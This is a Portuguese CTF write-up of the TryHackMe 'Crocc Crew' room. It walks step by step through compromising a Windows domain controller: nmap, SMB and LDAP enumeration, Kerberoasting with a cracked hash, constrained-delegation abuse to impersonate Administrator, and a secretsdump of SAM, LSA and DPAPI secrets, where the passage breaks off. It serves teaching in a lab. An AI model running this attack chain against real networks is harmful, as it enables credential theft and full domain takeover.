<p><img src="/img/thm/thm-crocccrew-logo.png" /></p>

<p><br /></p>

<table>
  <thead>
    <tr>
      <th>Nome</th>
      <th><a href="https://tryhackme.com/room/crocccrew">Crocc Crew</a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Nível</td>
      <td>Insane</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<p>Esta máquina tem algumas flags a mais do que as simples <code class="language-plaintext highlighter-rouge">user.flag</code> e <code class="language-plaintext highlighter-rouge">root.flag</code>, aparentemente precisaremos fazer alguns movimentos laterais antes de comprometer o server de forma completa.</p>

<p><img src="/img/thm/thm-crocccrew-1.png" /></p>

<p>Na descrição do projeto, sabemos que só temos acesso a um segmento de uma rede, um Domain Controller, e aparentemente ele já foi hackeado, a questão é <code class="language-plaintext highlighter-rouge">você consegue encontrar quem fez isso?</code>.</p>

<p>Vamos começar.</p>

<h2 id="recon">RECON</h2>

<h3 id="nmap">Nmap</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.255.206 <span class="nt">--min-rate</span><span class="o">=</span>512
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-09-15 00:55:46Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: COOCTUS.CORP0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: COOCTUS.CORP0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2021-09-15T00:56:44+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.COOCTUS.CORP
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC.COOCTUS.CORP
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-06-07T02:37:18
| Not valid after:  2021-12-07T02:37:18
| MD5:   72be 3896 d880 1bc2 2455 1d55 33da 9300
|_SHA-1: bb1b c5bc 3aef ede9 3dc2 8b0d 0b00 c1d3 4371 19f4
|_ssl-date: 2021-09-15T00:58:08+00:00<span class="p">;</span> <span class="nt">-1h00m00s</span> from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC

</code></pre></div></div>

<p>Por se tratar de um Domain Controller, o nmap nos trouxe uma grande quantidade de portas abertas. Vamos começar pela 80.</p>

<h3 id="porta-80">Porta 80</h3>

<p><img src="/img/thm/thm-crocccrew-2.png" /></p>

<p>Encontramos na porta HTTP, uma página aparentemente já hackeada sem links relevantes, ao checar o <code class="language-plaintext highlighter-rouge">/robots.txt</code>, encontramos dois diretórios desabilitados.</p>

<p><img src="/img/thm/thm-crocccrew-3.png" /></p>

<p>Ao acessar o <code class="language-plaintext highlighter-rouge">/db-config.bak</code>, encontramos possíveis credenciais para um banco de dados.</p>

<p><img src="/img/thm/thm-crocccrew-4.png" /></p>

<p>Já no diretório <code class="language-plaintext highlighter-rouge">/backdoor.php</code> encontramos uma simulação de shell.</p>

<p><img src="/img/thm/thm-crocccrew-5.png" /></p>

<p>Aparentemente não passa de um <code class="language-plaintext highlighter-rouge">rabbit role</code> que nos fará perder tempo, vamos avançar na enumeração.</p>

<h3 id="porta-3389---rdp">Porta 3389 - RDP</h3>

<p>Na enumeração com nmap, também encontramos a porta <code class="language-plaintext highlighter-rouge">3389</code>, que tipicamente é usada para o serviço <code class="language-plaintext highlighter-rouge">RDP</code>, não temos um usuário e nem uma senha, mas podemos tentar uma conexão com o <code class="language-plaintext highlighter-rouge">rdesktop</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>rdesktop 10.10.255.206   
</code></pre></div></div>

<p>Entramos na tela de login, não temos credenciais, mas podemos ver um <code class="language-plaintext highlighter-rouge">stick</code> cortado pela tela no canto inferior direito.</p>

<p><img src="/img/thm/thm-crocccrew-6.png" /></p>

<p>Podemos rodar o rdesktop em tela cheia para visualizarmos o stick inteiro.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>rdesktop <span class="nt">-f</span> 10.10.255.206   
</code></pre></div></div>

<p><img src="/img/thm/thm-crocccrew-7.png" /></p>

<p>Encontramos as credenciais <code class="language-plaintext highlighter-rouge">Visitor:GuestLogin!</code>, porém, esta credencial não foi aceita no RDP.
Aparentemente é tudo que encontramos no RDP.</p>

<h3 id="smb">SMB</h3>

<p>O server também tem SMB, vamos tentar um acesso com <code class="language-plaintext highlighter-rouge">null session</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\</span>10.10.255.206
Enter WORKGROUP<span class="se">\h</span>astur<span class="s1">'s password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</span></code></pre></div></div>

<p>Não temos acesso com null session, mas podemos tentar com as credenciais que encontramos no stick do RDP.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\</span>10.10.255.206 <span class="nt">-U</span> Visitor 
Enter WORKGROUP<span class="se">\V</span>isitor<span class="s1">'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
</span></code></pre></div></div>
<p>Desta vez conseguimos validar a credencial!!!</p>

<p>Vamos nos conectar no diretório <code class="language-plaintext highlighter-rouge">Home</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.255.206<span class="se">\\</span>Home <span class="nt">-U</span> Visitor 
Enter WORKGROUP<span class="se">\V</span>isitor<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Jun  8 15:42:53 2021
  ..                                  D        0  Tue Jun  8 15:42:53 2021
  user.txt                            A       17  Mon Jun  7 23:14:25 2021

                15587583 blocks of size 4096. 11430005 blocks available
smb: \&gt; get user.txt 
getting file \user.txt of size 17 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \&gt; 
</span></code></pre></div></div>
<p>Conseguimos nos autenticar conseguimos a primeira flag, a <code class="language-plaintext highlighter-rouge">user.txt</code>!!!</p>

<p>Porém nenhum outro diretório trouxe alguma informação relevante, vamos continuar as enumerações.</p>

<h3 id="ldap">LDAP</h3>

<p>Como a credencial funcionou perfeitamente com o SMB, podemos tentar usá-la para obter indormações do AD, com o <code class="language-plaintext highlighter-rouge">ldapsearch</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 10.10.255.206 <span class="nt">-x</span> <span class="nt">-s</span> base namingcontexts
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;&gt; (default) with scope baseObject</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: namingcontexts </span>
<span class="c">#</span>

<span class="c">#</span>
dn:
namingcontexts: <span class="nv">DC</span><span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
namingcontexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
namingcontexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
namingcontexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
namingcontexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP

<span class="c"># search result</span>
search: 2
result: 0 Success

<span class="c"># numResponses: 2</span>
<span class="c"># numEntries: 1</span>

┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 10.10.255.206 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=COOCTUS,DC=CORP"</span>
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;DC=COOCTUS,DC=CORP&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>

<span class="c"># search result</span>
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful <span class="nb">bind </span>must be completed on the connection., data 0, v4563

<span class="c"># numResponses: 1</span>

</code></pre></div></div>

<p>Agora rodando com autenticação, podemos obter informações mais completas sobre usuários, inclusive o possível <code class="language-plaintext highlighter-rouge">usuário implantado</code> que corresponde à segunda flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 10.10.255.206 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=COOCTUS,DC=CORP"</span> <span class="nt">-D</span> <span class="s2">"COOCTUS</span><span class="se">\V</span><span class="s2">isitor"</span> <span class="nt">-W</span>
<span class="nt">----------CORTADO-----------</span>
<span class="c"># admCroccCrew, Enterprise-Admins, Security-OU, COOCTUS.CORP</span>
dn: <span class="nv">CN</span><span class="o">=</span>admCroccCrew,OU<span class="o">=</span>Enterprise-Admins,OU<span class="o">=</span>Security-OU,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: admCroccCrew
givenName: admCroccCrew
distinguishedName: <span class="nv">CN</span><span class="o">=</span>admCroccCrew,OU<span class="o">=</span>Enterprise-Admins,OU<span class="o">=</span>Security-OU,DC<span class="o">=</span>COOC
 TUS,DC<span class="o">=</span>CORP
instanceType: 4
whenCreated: 20210608031534.0Z
whenChanged: 20210608062014.0Z
displayName: admCroccCrew
uSNCreated: 49236
memberOf: <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
uSNChanged: 69730
name: admCroccCrew
objectGUID:: <span class="nv">ej4EyTrxQECq9t62o8ROGg</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132676033890368878
lastLogoff: 0
lastLogon: 132676033917094150
pwdLastSet: 132676009478796916
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAJqvqeuD7CtfhfJd7YQQAAA</span><span class="o">==</span>
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: admCroccCrew
sAMAccountType: 805306368
userPrincipalName: admCroccCrew@COOCTUS.CORP
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>COOCTUS,DC<span class="o">=</span>CORP
dSCorePropagationData: 20210608191453.0Z
dSCorePropagationData: 20210608185942.0Z
dSCorePropagationData: 20210608185055.0Z
dSCorePropagationData: 20210608062014.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132676009766264244

<span class="nt">----------CORTADO-----------</span>
</code></pre></div></div>
<p>O usuário implantado é <code class="language-plaintext highlighter-rouge">admCroccCrew</code>.</p>

<h3 id="kerberos">Kerberos</h3>

<p>Vimos na varredura com nmap que a porta 88 está aberta, tipicamente <code class="language-plaintext highlighter-rouge">kerberos</code>.
Podemos utilizar o <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code> para tentarmos obter um <code class="language-plaintext highlighter-rouge">TGT Ticket</code> com a credencial que temos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:<span class="s1">'GuestLogin!'</span> <span class="nt">-dc-ip</span> 10.10.255.206 <span class="nt">-outputfile</span> <span class="nb">hash
</span>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
<span class="nt">--------------------</span>  <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">-----------</span>
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 



<span class="o">[</span>-] Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>


</code></pre></div></div>
<p>Ótimo, conseguimos nos conectar, e aparentemente o nome do usuário é <code class="language-plaintext highlighter-rouge">password-reset</code>, mas não obtivemos resposta, isto acontece pelo fato da minha data e hora local, está fora do range do kerberos, conforme a mensagem de erro. Precisamos ajustar nossa hora de acordo com a hora do servidor.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span><span class="nb">sudo </span>net <span class="nb">time set</span> <span class="nt">-S</span> 10.10.255.206
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>hastur: 
</code></pre></div></div>

<p>Agora tentando novamente, conseguimos a hash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:<span class="s1">'GuestLogin!'</span> <span class="nt">-dc-ip</span> 10.10.255.206 <span class="nt">-outputfile</span> <span class="nb">hash
</span>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
<span class="nt">--------------------</span>  <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">-----------</span>
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 

                                                                                                                     
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 16
drwxr-xr-x  2 hastur hastur 4096 Sep 14 21:46 <span class="nb">.</span>
drwxr-xr-x 33 hastur hastur 4096 Sep 14  2021 ..
<span class="nt">-rw-r--r--</span>  1 hastur hastur 2016 Sep 14 21:46 <span class="nb">hash</span>
<span class="nt">-rw-r--r--</span>  1 hastur hastur   17 Sep 14  2021 user.txt
                                                                                                                     
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span><span class="nb">cat hash</span>
<span class="nv">$krb5tgs$23$*</span>password-reset<span class="nv">$COOCTUS</span>.CORP<span class="nv">$cooctus</span>.corp/password-reset<span class="k">*</span><span class="nv">$856443556e2d8c04016648f5f7c47aac$ab62d496b9de12bd3b674760f374e6171f73181c5a4f5f3f033f1edb12663d3a264b8d87688689d11dd3eebb20536fceba58cb863736ea0fcb2a46f12e66d8aebb5ccbb9973f09ea22642805b71d58b7faa2e26dc3652c2d4586e95e660a6c98ec4b01c8a1f6258a26dc2839530eab17a6bf4d0430ca01f6fd4371bd6d5ac99563d2d7318e0078bf4c1dad4f42138e0ffb646213794b57d4f0e136929ec40cc28ea114b636919c35e797454bd019b04ee14f60ccaf1a33d6205d7ccf84572362910a9deab4fef36c862509383e23cbf41d1bcd26d64ab6244fcfd8f3653dd86220e564fd7be5ca2c6c6c43f359027831931a9aa0fa7abc1fa4a7b161f78b2385f1383819b53dd39993f23896ed21171b1155f1fa7ae9dfdd5e30282f171928dbfaa7d27ddc686c1f952f7dbaaeaf2649087907be62b0765d045250c84c36b4cb265b62dc85bd37a9ac707706de82002de994e3e86f637dec3ebf8dc5642b7d4fd2a8b2f7d2691d6080d6ab7ffd1af90ac3fb5206327a97e1fbbfd2f7bb47cbd12584b36d161da01e7fc854b35aae246718bec37722bfca3efe069f859d95f98854b9dfe773afbf3380d92ab01d4c09af14dc7563b3d61ebf742c089f58f660fe3f1a25e4a384fb375007e2254cbe88133cf1abaa492e2ea06e1008b154e08827b32468fa75aa811f462d020f4625c1e872cf43f7cc009bc6539fba74de6e39a6ef3d17276f25772fa444b5f1783bfbdb3cb70bbeda45b12f3c9b3cf10a8e341c66016dd6db65a84078d83043b19c359c5adba926713e4a86a12394ec4b05b35402f6cdbe95844b99beb4f8b25fd6b4efba07e3043e2e8643ae992118b20f43865c182505a76be0275d98cdc90efd0f2b3983b0005c23212a55376a7f7d97c6b6999ae0def9f0a9939c59ee364eb486346befe43cf6466d36d07e21b3e499cf80e17b5267fbf4ac59bce60c685aaa5ea012e17802bc983bc74f893923df61fa42f1522a7d4eabc507d08c768d03bf0600f467dad2878c4382a908510a95ef96da80b0add4d898a5986305f776a332f549fa86315d0388b7ff84d833a5b17cb86b49b52063a1b7dd80b71e9b72f067f5ea252564f87c443660eefabd92bea5f86310ca29ad29fa78b7f132cbf9fb301f7f7a69712d54c031d1d47970261ab97b3e942f9e2ccad85c21c66484f39d436a7212b3c2831fa71af179c8b8884a3d6698668d224ebbc4782fdd6de86fa1dc4f84b4baa3c0034e584a4b136f479344d350d0261b2126161898fcaec220111f5fef17e43a3edad0097cb79031ff188064d4095e30f14c85b40fde566fff5d11d4d86409a1594e21fa802b7a5c50</span>
</code></pre></div></div>

<p>Podemos tentar quebrá-la com o <code class="language-plaintext highlighter-rouge">john</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
resetpassword    <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2021-09-14 21:48<span class="o">)</span> 5.555g/s 1319Kp/s 1319Kc/s 1319KC/s rikelme..nichel
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>
<p>Com a credencial <code class="language-plaintext highlighter-rouge">password-reset:resetpassword</code>, podemos verificar se ele possui a opção <code class="language-plaintext highlighter-rouge">impersonate</code> habilitada e tentar um <code class="language-plaintext highlighter-rouge">TGT Silver Ticket</code> no kerberos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/getST.py <span class="nt">-dc-ip</span> 10.10.255.206 <span class="nt">-spn</span> HTTP/dc.cooctus.corp <span class="nt">-impersonate</span> Administrator cooctus.corp/password-reset:resetpassword
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2Proxy
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_BADOPTION<span class="o">(</span>KDC cannot accommodate requested option<span class="o">)</span>
<span class="o">[</span>-] Probably SPN is not allowed to delegate by user password-reset or initial TGT not forwardable

</code></pre></div></div>
<p>Aparentemente este <code class="language-plaintext highlighter-rouge">SPN</code> não é habillitado para delegar um TGT silver ticket para este usuário.
Podemos verificar se existe algum SPN habilitado a delegar, com o <code class="language-plaintext highlighter-rouge">impacket-findDelegation.py</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/findDelegation.py cooctus.corp/password-reset:resetpassword <span class="nt">-dc-ip</span> 10.10.255.206
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

AccountName     AccountType  DelegationType                      DelegationRightsTo                  
<span class="nt">--------------</span>  <span class="nt">-----------</span>  <span class="nt">----------------------------------</span>  <span class="nt">-----------------------------------</span>
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP              
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                           
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS      
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS   
</code></pre></div></div>

<p>Ótimo, encontramos alternativas para o SPN.</p>

<p>Vamos tentar o Silver Ticket novamente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/getST.py <span class="nt">-dc-ip</span> 10.10.255.206 <span class="nt">-spn</span> oakley/DC.COOCTUS.CORP <span class="nt">-impersonate</span> Administrator cooctus.corp/password-reset:resetpassword
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
                                                                                                                     
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxr-xr-x  2 hastur hastur 4096 Sep 14 22:03 <span class="nb">.</span>
drwxr-xr-x 33 hastur hastur 4096 Sep 14 21:56 ..
<span class="nt">-rw-r--r--</span>  1 hastur hastur 1565 Sep 14 22:03 Administrator.ccache
<span class="nt">-rw-r--r--</span>  1 hastur hastur 2016 Sep 14 21:46 <span class="nb">hash</span>
<span class="nt">-rw-r--r--</span>  1 hastur hastur   17 Sep 14  2021 user.txt
</code></pre></div></div>

<p>Ótimo, conseguimos recuperar as credenciais do Administrador que foram armazenadas no arquivo <code class="language-plaintext highlighter-rouge">Administrator.ccache</code>, este arquivo deve ser colocado em uma variável para que possamos utilizá-lo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<h2 id="capturando-as-hashes">Capturando as Hashes</h2>

<p>Com as credenciais do Administrador em mãos e salvas em uma variável, podemos utilizar o <code class="language-plaintext highlighter-rouge">secretsdump.py</code> para capturar as hashes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-k</span> <span class="nt">-no-pass</span> DC.COOCTUS.CORP
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try <span class="nt">-just-dc-user</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>

<p>O secretsdump nos trouxe um erro, mas provavelmente porque não reconheceu o <code class="language-plaintext highlighter-rouge">DC.COOCTUS.CORP</code>, precisamos adicioná-lo em <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Após a inclusão, tentamos outra vez.</p>

<p><img src="/img/thm/thm-crocccrew-8.png" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/CroccCrew]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-k</span> <span class="nt">-no-pass</span> DC.COOCTUS.CORP
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is <span class="k">in </span>stopped state
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service RemoteRegistry
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping <span class="nb">local </span>SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<span class="o">[</span>-] SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:2878ba3e01019d97754058e82113bc45e2efc6414a89804c6939fd411029f452735078dca29cbe0c68a957e62aa648741fee7954fc38d3f9410430920d8be3e4114a44037de3dbedf624ca07680126a1ea95a2c73a784c6babd59532e70049a61ef49a5e398231beb345720d5be76c27dd4e9f0cfd63388ce7193fdba2b2f6ec371076e9b34762f791ff8fc73e5a29f548b30f66c3a658f0c11953d5375621b09ffdc800085422a28889a4c2b1830af7b30bf5521f1b5f2bdefcc2f2642c3291f641af22c8deb74f8aba62a37841ff2116df9939c1b36368acfbc7ae7e9b14ab9b1ff5bee0e73968381b3d913fbd2dec
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:8974754c17974ff870762db617c2b60c:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
